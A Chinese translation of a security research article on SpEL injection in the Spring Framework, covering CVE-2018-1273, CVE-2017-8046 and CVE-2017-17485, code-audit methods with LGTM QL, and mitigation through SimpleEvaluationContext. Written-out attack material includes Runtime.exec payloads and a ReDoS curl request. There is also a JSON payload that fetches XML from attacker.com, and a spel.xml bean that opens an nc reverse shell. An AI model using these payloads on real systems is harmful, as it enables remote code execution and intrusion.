### SpEL injection

> 原文作者：[webr0ck](https://twitter.com/webr0ck)
> 本文由[Cryin'](https://cryin.github.io/)译自[@webr0ck's SpEL injection ](https://m.habr.com/company/dsec/blog/433034/)

#### 介绍 

在各种安全相关工作及研究过程中，越来越多地涉及到Spring Framework的安全问题。要研究Spring框架的安全，合乎逻辑的步骤是先熟悉其结构和可能存在的漏洞。

而安全人员最感兴趣的可能就是RCE这类高危漏洞。

在Spring中存在较多的RCE的漏洞都是因SpEL表达式注入产生。

在本文中，我们将尝试弄清楚SpEL是什么，在什么场景下使用，作用是什么，以及如何找到任意SpEL表达式注入的点。

#### SpEL

SpEL，Spring表达式语言全称为Spring Expression Language，是Spring Framework创建的一种表达式语言，它支持在运行时查询和操纵对象图表。这里要注意的是SpEL是以API接口的形式创建的，允许将其集成到其他应用程序和框架中。

##### SpEL使用实例

在Spring Framework中SpEL的使用是比较常见的。一个很好的例子是[Spring Security](https://github.com/spring-projects/spring-security)，其中使用SpEL表达式分配权限：

```java
@PreAuthorize("hasPermission(#contact, 'admin')")
public void deletePermission(Contact contact, Sid recipient, Permission permission);
```

如图所示:

![2grqgp1bk2lc_ajrxtbl4rcsrq4.png](https://habrastorage.org/webt/2g/rq/gp/2grqgp1bk2lc_ajrxtbl4rcsrq4.png)

[Apache Camel](https://github.com/apache/camel)使用SpEL API; 以下是其文档中的示例。使用SpEL表达式形成一个字母：

```html
<route>
<from uri="direct:foo"/>
<filter>
    <spel>#{request.headers['foo'] == 'bar'}</spel>
    <to uri="direct:bar"/>
</filter>
</route>
```

或者，你可以使用外部文件中的规则来指定标题：

```java
.setHeader("myHeader").spel("resource:classpath:myspel.txt")
```

在GitHub上遇到的几个例子：
* https://github.com/jpatokal/openflights
![sewdgepwblvm0cslrn30d5glbem.png](https://habrastorage.org/webt/se/wd/ge/sewdgepwblvm0cslrn30d5glbem.png)
* https://github.com/hbandi/LEP
![xmnrh2rhtdc_eqlfpgqqmukaemu.png](https://habrastorage.org/webt/xm/nr/h2/xmnrh2rhtdc_eqlfpgqqmukaemu.png)

#### Spring框架和SpEL基础知识

为了使读者更容易理解SpEL注入是什么，有必要先熟悉Spring和SpEL。

Spring Framework的关键元素是Spring Container。Spring Container管理的对象称为bean，Spring Container就是一个bean工厂，对象的创建、获取、销毁等都是由Spring Container管理的。

为了管理构成应用程序的组件，Spring Container使用依赖注入管理对象依赖关系。Spring支持以下方式配置如何注入依赖：
* XML
* java注解
* java代码

对我们来说另一个重点是ApplicationContext。

org.springframework.context.ApplicationContext接口用于完成容器的配置，初始化，管理bean。一个Spring容器就是某个实现了ApplicationContext接口的类的实例。也就是说，从代码层面，Spring容器其实就是一个ApplicationContext。
![gzpgtdz46xowwzhkoa4vsld7utq.png](https://habrastorage.org/webt/gz/pg/td/gzpgtdz46xowwzhkoa4vsld7utq.png)

现在我们将关注如何配置bean并使用SpEL表达式

##### Bean.XML
典型的一个用法示例是将SpEL集成到XML的创建或bean的注释定义中：

```xml
<bean id=“exmple" class="org.spring.samples.NumberGuess">
<property name="randomNumber" value="#{ T(java.lang.Math).random() * 100.0 }"/>
<property name="defaultLocale" value="#{ systemProperties['user.region'] }"/>
<property name="defaultLocale2" value="${user.region}"/>
</bean>
```
这是Bean.xml文件中的一部分代码，仅用于配置其中一个bean。值得注意的是可以通过它访问的bean的id以及其它属性。因为在本文的框架中，我们考虑了操作SpEL的可能性，然后该示例将显示用于记录此类表达式的几个选项。

SpEL表达式由＃符号括号括起来，如\#{SpEL_expression}。属性名称引用可以用$符号\${someProperty}。属性本书可能不包含SpEL表达式，但表达式可以包含对属性的引用：
```
"#{${someProperty}"
```

因此，您可以调用我们需要的任何Java类，或者访问环境变量，这对于确定用户名或系统版本很有用。

这种配置bean的方法的便利之处在于能够在不重新编译整个应用程序的情况下更改它们，从而改变应用程序的行为。

从应用程序本身，可以使用ApplicationContext接口访问此bean，如下所示：

```java
ApplicationContext ctx = new ClassPathXmlApplicationContext(“Bean.xml”);
MyExpression example = ctx.getBean(“example", MyExpression.class); " + 
        "System.out.println(“Number : " + example.getValue()); 
System.out.println(“Locale : " + example.getDefaultLocale());
System.out.println(“Locale : " + example.getDefaultLocale2());
```
即在应用程序内部，我们只需获取包含SpEL表达式的参数的值。Spring收到这样的值后，执行表达式并输出最终结果。此外，不要忘记，如果没有适当的getter，此代码将无法工作，但它们的描述超出了本文的范围。

设置bean的另一种方法是AnnotationBase注解方法 - 参数值在类的注解中设置。在这种情况下，不可能使用变量。
```java
public static class FieldValueTestBean
   @Value("#{ systemProperties['user.region'] }")
   private String defaultLocale;
   public void setDefaultLocale(String defaultLocale) {
      this.defaultLocale = defaultLocale;
   }
   public String getDefaultLocale() {
      return this.defaultLocale;
   }
}
```

为了能够使用变量，我们需要在创建SpEL表达式时使用ExpressionParser接口。然后在应用程序代码中会出现一个类，类似于以下示例：
```java
public void parseExpressionInterface(Person personObj,String property) {
   ExpressionParser parser = new SpelExpressionParser();
   Expression exp = parser.parseExpression(property+" == ‘Input'");
   StandardEvaluationContext testContext = new StandardEvaluationContext(personObj);
   boolean result = exp.getValue(testContext, Boolean.class);
```

ExpressionParser将字符串表达式转换为Expression对象。因此，parseExpression的值将在EvaluationContext中可用。此EvaluationContext将是唯一可以从中访问字符串EL中的所有属性和变量的对象。

值得注意的另一个重要事实。使用这种使用SpEL的方法，我们需要字符串表达式只包含＃，除了表达式本身，它还包含字符串文字。

综上所述，有两件事值得记住：

* 1）如果您可以按应用程序代码进行搜索，那么判断是否使用SpEL表达式解析可以查找以下关键字：SpelExpressionParser，EvaluationContext和parseExpression。
* 2）SpEL表达语句的特点是\#{SpEL}，\${someProperty}和\T(javaclass)

如果你想了解更多详细信息，了解春和SpeI，我们建议您注意文档[docs.spring.io 6. Spring Expression Language (SpEL)](https://docs.spring.io/spring/docs/3.0.x/reference/expressions.html)

#### SpEL可以做什么？
根据官方文档介绍，SpEL支持以下功能：
* Literal expressions
* Boolean and relational operators
* Regular expressions
* Class expressions
* Accessing properties, arrays, lists, maps
* Method invocation
* Relational operators
* Assignment
* Calling constructors
* Bean references
* Array construction
* Inline lists
* Ternary operator
* Variables
* User defined functions
* Collection projection
* Collection selection
* Templated expressions

我们可以看到，SpEL功能非常丰富，如果用户输入包含在ExpressionParser中，这会对产品的安全性带来负面影响。因此，Spring建议在处理SpEL表达式时使用更安全、同时也是支持最基本功能的SimpleEvaluationContext，而不是功能更强同时安全隐患较大的StandardEcalutionContext，

简而言之，对于我们来说，尽量使用较安全的SimpleEvaluationContext，很重要一点是使用SimpleEvaluationContext，则SpEL无法调用Java类对象、引用bean。

可参考官方网站上完整功能描述：
* [StandardEvaluationContext (Spring Framework 5.1.3.RELEASE API)](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/expression/spel/support/StandardEvaluationContext.html)
* [SimpleEvaluationContext (Spring Framework 5.0.6.RELEASE API)](https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html)

为了更清楚的展示两种EvaluationContext在处理SpEL功能上的差异，我们举一个例子。这里有一个包含SpEL表达式的恶意字符串：

```java
String inj = "T(java.lang.Runtime).getRuntime().exec('calc.exe')";
```

两种用法：

```java
StandardEvaluationContext std_c = new StandardEvaluationContext();
```
和

```java
EvaluationContext simple_c = SimpleEvaluationContext.forReadOnlyDataBinding ().build();
```
表达式exp = parser.parseExpression（inj）; 执行的结果如下：

java exp.getValue(std_c); - 计算器将启动
java exp.getValue(simple_c); - 运行出现错误

另一个有趣的观点是，我们可以开始处理表达式而不指定任何EvaluationContext：exp.getValue();
在这种情况下，表达式将以StandardEvaluationContext处理，因此，恶意代码将被执行。所以，如果你是程序员并使用Spring - 永远不要忘记设置应该执行表达式的EvaluationContext。

历史上出现过相关的SpEL表达式注入导致的RCE安全漏洞，而修复方式则是使用SimpleEvaluationContext替代StandardEvaluationContext。

##### CVE 2018-1273  Spring Data Commons RCE

此漏洞在setPropertyValue方法中找到，并且基于两个问题：
1）对进入ExpressionParser的变量值的过滤不足。
2）使用StandardEvaluationContext执行表达式。

以下是存在安全漏洞的部分代码的屏幕截图：
![rb84_76_bpq3ywrf-icytp5hvs8.png](https://habrastorage.org/webt/rb/84/_7/rb84_76_bpq3ywrf-icytp5hvs8.png)

因为属性名称不需要在SpEL框架内进行复杂的处理，这个场景使用SimpleEvaluationContext即可满足需求，所以修复代码替换EvaluationContext即可缓解风险，如下：
![xwreueydsgforfjf365mwdrpcuc.png](https://habrastorage.org/webt/xw/re/ue/xwreueydsgforfjf365mwdrpcuc.png)

屏幕截图显示了设置上下文和将要执行的表达式的代码部分。但表达式的执行发生在其他地方：
```java
expression.setValue(context, value);
```
就在这里，使用指定的EvaluationContext（context）执行SpEL表达式（expression）。
使用SimpleEvaluationContext有助于防止将Java类引入parseExpression，现在我们将看到错误，而不是执行恶意表达式中构造的代码：
```
Type cannot be found 'java.lang.Runtime'
```
但这里还是没有对传入的参数进行安全过滤，因此仍然可以进行拒绝服务攻击：
```
curl -X POST http://localhost:8080/account -d "name['aaaaaaaaaaaaaaaaaaaaaaaa!'%20matches%20'%5E(a%2B)%2B%24']=test"
```
后来的修复已经增加了对输入参数的安全过滤处理。

#### 从理论到实践
现在让我们看一下使用白盒方法挖掘SpEL注入的几种方法。

##### 一步一步CVE-2017-8046
首先，需要找到处理SpEL表达式的位置。为此，你只需使用我们的建议并在代码中查找关键字即可。回想一下这些词：SpelExpressionParser，EvaluationContext和parseExpression。
另一个选择是使用各种插件来查找代码中SpEL注入漏洞。如[findsecbugs-cli](https://github.com/find-sec-bugs)

所以，假设我们使用findsecbugs-cli在代码中找到了一个感兴趣的地方：
![wg_ws5vbnh1z6vds1-gxjc3zhk0.png](https://habrastorage.org/webt/wg/_w/s5/wg_ws5vbnh1z6vds1-gxjc3zhk0.png)

在代码中，我们将看到以下内容：
```java
public class PathToSpEL {

   private static final SpelExpressionParser SPEL_EXPRESSION_PARSER = new SpelExpressionParser();
   static final List<String> APPEND_CHARACTERS = Arrays.asList("-");

   /**
    * Converts a patch path to an {@link Expression}.
    * 
    * @param path the patch path to convert.
    * @return an {@link Expression}
    */
   public static Expression pathToExpression(String path) {
      return SPEL_EXPRESSION_PARSER.parseExpression(pathToSpEL(path));
   }
```
下一步是找出变量path是从什么地方进入表达式解析器的。一种相当方便和免费的方法是使用IDE的IntelijIdea - Analyze Dataflow：
![gdudag-ykwbmvin_70mowuh838u.png](https://habrastorage.org/webt/gd/ud/ag/gdudag-ykwbmvin_70mowuh838u.png)

回溯变量，我们得到以下结果，ReplaceOperation方法获取了path变量的值。
```java
public ReplaceOperation(String path, Object value) {
   super("replace", path, value);
}
```

要触发调用replace方法，需要将值为"replace"的变量op传递给JSON。
```java
JsonNode opNode = elements.next();

String opType = opNode.get("op").textValue();

else if (opType.equals("replace")) {
   ops.add(new ReplaceOperation(path, value));
```

这样我们就找到用户可控的变量。然后，一个可能的漏洞利用方式将如下所示：
请求method：PATCH 
请求body：
```
[{ "op" : "add", "path" : "T(java.lang.Runtime).getRuntime().exec(\"calc.exe\").x", "value" : "pwned" }]
```
##### 使用LGTM QL
使用[LGTM QL](https://lgtm.com)（在本文中，简称为QL） - 这是另一种发现漏洞的有趣方式。

有必要先讨论一下lgtm的不足之处。对于免费版本，只能分析GitHub上的开放的代码项目，为了创建项目的快照，LGTM将把工程下载到其服务器并编译。如果这些都不是问题，那么LGTM QL白盒代码分析能力还是很强大的。

那么，什么是使用QL的应用分析？

首先，正如我们所说，你需要创建应用程序的快照。

快照准备就绪后，可能需要比较长时间，你可以开始使用QL语法中编写类似SQL的查询。可以使用Eclipse插件，也可以直接在项目的QL页面上的控制台中操作。

因为，我们现在分析的Spring框架，是一个Java框架，所以你要清楚你感兴趣的类以及这个类的方法，它的调用被认为是可能存在安全漏洞的。对我们来说，调用ExpressionParser的方法的任何类我们都需要关注。

然后我们进一步确定满足我们要求的所有方法，例如，根据方法中的变量作为过滤条件去掉不满足要求的方法。
![orcsbusthzp51u1y_l0wuupohe8.png](https://habrastorage.org/webt/or/cs/bu/orcsbusthzp51u1y_l0wuupohe8.png)

那么，你需要做些什么才能找到CVE 2018-1273漏洞？
在lgtm添加项目后，我们使用QL控制台来描述感兴趣的方法。为此：
我们描述了ExpressionParser类：
```java
class ExpressionParser extends RefType {
  ExpressionParser() {
    this.hasQualifiedName("org.springframework.expression", "ExpressionParser")
  }
}
```
以及可用于在ExpressionParser类中执行的方法：
```java
class ParseExpression extends MethodAccess {
  ParseExpression() {
    exists (Method m |
      (m.getName().matches("parse%") or m.hasName("doParseExpression"))
      and
      this.getMethod() = m
    )
  }
}
```
现在，需要将这些描述组织在一起并进行select：
```java
class ParseExpression extends MethodAccess {
  ParseExpression() {
    exists (Method m |
      (m.getName().matches("parse%") or m.hasName("doParseExpression"))
      and
      this.getMethod() = m
    )
  }
}
```
这样的查询将返回以parse开头或名称为doParseExpression的所有方法，这些方法将属于ExpressionParser类。但是，这样可能会出现很多不需要的结果。所以需要添加过滤器。不然无关的方法也有可能被查询出来。
```java
* Converts a patch path to an {@link Expression}.
     * 
     * @param path the patch path to convert.
```
例如，如下方法可以在Javadoc或注释中搜索关键字“path”。Spring代码注释非常规范，我们可以通过注释特征来进一步找到真正需要的方法调用，同时过滤掉无关的方法。如下：
```java
class CallHasPath extends Callable {
  CallHasPath() {
    not this.getDeclaringType() instanceof TestClass and
    (
      this.getDoc().getJavadoc() instanceof DocHasPath or
      this.getDeclaringType().getDoc().getJavadoc() instanceof DocHasPath
    )
  }
}
```
然后，可以组合Javadoc、类、方法作为最后的过滤条件，示例查询将如下所示：
```java
from ParseExpression expr, CallHasPath c
where (expr.getQualifier().getType().(RefType).getASupertype*() instanceof ExpressionParser and
       c = expr.getEnclosingCallable())
select expr, c
```
上述QL示例还是相对比较简单的，但是可以搜索到特定漏洞，如上QL搜索到两处潜在SpEL注入的点，执行结果参考[LGTM-QL](https://lgtm.com/query/2141670445/)。QL功能强大，还可以编写更有趣、更复杂的判断逻辑提高搜索准确性。
##### Jackson and Bean

CVE-2017-17485基于FileSystemXmlApplicationContext的使用，FileSystemXmlApplicationContext是一个独立的XML应用程序上下文，用于从文件系统或URL检索上下文定义文件。
根据文档描述，它允许从文件加载bean并重新加载应用程序上下文。

> “… Create a new FileSystemXmlApplicationContext, loading the definitions from the given XML files and automatically refreshing the context”

Jackson是一个可以序列化和反序列化除黑名单之外的任何对象的库。入侵者经常使用此功能。对于此漏洞，攻击者必须传递一个对象org.springframework.context.support.FileSystemXmlApplicationContext，该对象的值包含攻击者控制的文件的路径。

对于此漏洞，攻击者必须传递一个对象org.springframework.context.support.FileSystemXmlApplicationContext，该对象的值包含攻击者控制的文件的路径。

即在请求的body中，可以传递以下JSON：
```json
{"id":123, "obj": ["org.springframework.context.support.FileSystemXmlApplicationContext", "https://attacker.com/spel.xml"]}
```

Spel.xml将包含bean的配置参数：
```xml
<beans xmlns="http://www.springframework.org/schema/beans"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="http://www.springframework.org/schema/beans
http://www.springframework.org/schema/beans/spring-beans.xsd">
<bean id="pb" class="java.lang.ProcessBuilder">
  <constructor-arg>
    <list value-type="java.lang.String" >
       <value>nc</value>
       <value>X.X.X.X</value>
       <value>9999</value>
       <value>-e</value>
       <value>/bin/sh</value>
    </list>
  </constructor-arg>
  <property name="whatever" value="#{pb.start()}"/>
</bean>
</beans>
```
因为我们使用java.lang.ProcessBuilder类作为bean，它有一个start方法，然后在上下文重新加载后，Spring从SpEL属性读取启动ProcessBuilder的表达式，从而使服务器使执行nc命令连接到我们。

作为一个例子，值得关注spel.xml，因为它显示了在运行命令时如何传递参数。

我们还能加载我们的bean还是重新加载上下文？通过快速阅读Spring文档，你也可以找到一些对我们有用的类。

ClassPathXmlApplicationContext和AbstractXmlApplicationContext类似于FileSystem，但分别使用ClassPath和XML带注释的bean作为配置的路径。

还有一个与上下文重新加载相关的有趣点 - @RefreshScope。

任何使用@RefreshScope注解的Spring Bean都将在启动时刷新。并且所有使用它的组件将在下次方法该方法时会创建新对象，将完全初始化并放入依赖项。

RefreshScope是上下文中的一个组件，它有一个公共方法refreshAll，旨在通过清除目标缓存来刷新区域中的所有组件。因此，在使用@RefreshScope的情况下，用户可以引用以/refresh(译者注:SpringCloud2.0默认不暴露，且路径变为/actuator/refresh)结尾的URL，从而重新加载带此注解的bean。

##### 其他工具
还有许多其他插件和程序可以让您分析代码并找到漏洞。
* Jprofiler - 作为一个单独的应用程序 - IDE的插件。允许分析正在运行的应用程序。通过构建图形来分析对象的行为是非常方便的。缺点就是这是付费软件，但有10天的免费期。它被认为是分析应用程序行为的最佳工具之一，不仅从安全的角度来看。
![g4kiijoeylzhjo742es00a_ksti.png](https://habrastorage.org/webt/g4/ki/ij/g4kiijoeylzhjo742es00a_ksti.png)
* Xrebel - 付了钱，我们没有找到试用期的可能性。但也被认为是最好的之一。
* Coverity - 使用其服务器进行分析，因此仅对那些可怕的人来说是非常方便的。
* Checkmarx非常有名，有报酬，知道多种语言并且抛出了很多误报。但最好指出理论上可能存在错误的地方，而不是错过真正的错误。
* OWASP依赖性检查 - 作为各种收集器的便捷插件提供。在分析Java应用程序时，我们设法为Maven和Ant测试它。还支持.Net。在工作结束时，它提供了一个方便的报告，指出过时的库和已知的漏洞。
* Findbugs - 之前已经提到过。它有很多实现，但是最方便且出于某种原因显示更多问题的是findbugs_cli选项。它可以使用如下：findsecbugs.bat -progress -html -output report_name.htm "path\example.jar" 

* LGTM QL - 早期已经提供了一个使用它的例子。另外，我想说还有一个付费用例，在收购后你会收到一个本地服务器来分析你的代码。QL不仅支持Java，因此很可能对您来说分析应用程序也很方便。

##### 黑盒检测
一般来说，需要特别注意的是使用了Spring框架的应用，以在其代码中使用SpEL，使用SpEL API的应用程序，或与此主题完全无关的Web服务。

如果是使用Spring，那么应该注意包含API的URL。还有必要检查服务器对endpoints如/metrics和/bean的响应 - 这将确定Spring Boot Actuator是否被应用引入依赖并使用，这些应用系统的监控和管理相关的功能很有用。

接下来，我们来看看可以控制的参数变量。正如我们之前看到的，每个变量及输入参数都可能是SpEL表达式的输入点，因此对所有潜在的变量进行检查非常重要。

* 可变参数： var[SpEL]=123
* 变量名称： &variable1=123&SpEL=
* Cookies：org.springframework.cookie = ${}
* 不同类型的请求GET、POST、PUT、PATCH等
* 第三方库

###### 检测payload
```java
${1+3}
T(java.lang.Runtime).getRuntime().exec("nslookup !url!")
#this.getClass().forName('java.lang.Runtime').getRuntime().exec('nslookup !url!')
new java.lang.ProcessBuilder({'nslookup !url!'}).start()
${user.name}

```
#### 总结
实际上，SpEL并不是第一种表达语言，还有很多其他的EL注入已经被发现。以下是其中一些：OGNL，MVEL，JBoss EL，JSP EL。在某些情况下，这些表达式注入的payload甚至会相同。

在ZeroNights(本文作者[@webr0ck](https://twitter.com/webr0ck)在该会议上演讲[Spel injection议题](https://2018.zeronights.ru/en/materials/))有一个问题：“除了Spring之外，你还能找到SpEL注入吗？”

如果你看一下CVE，几乎都是Spring框架相关的漏洞。但事实上，还有更多的案例，而且不仅仅是在github上提供的应用程序中。

例如，本文的作者曾经遇到过这样的代码，当某个管理服务运行时，来自数据库的数据落入SpEL表达式。即攻击者（可能是同一个管理员）只需要向数据库写入特定的请求，即可在服务器上执行代码。

即我们可以将将必要的数据写入表中的能力与表达式注入分开。因此，在使用某种语言特定的功能比如表达式执行时，永远不要相信用户输入的数据，即便不是用户输入的也需要进行安全检查。

#### 原文相关链接
* [SpEL injection / @webr0ck](https://m.habr.com/company/dsec/blog/433034/)
* [spring-data-rest ql results](https://lgtm.com/query/2141670445/)
* [Materials – Zeronights 2018 EN](https://2018.zeronights.ru/en/materials/)
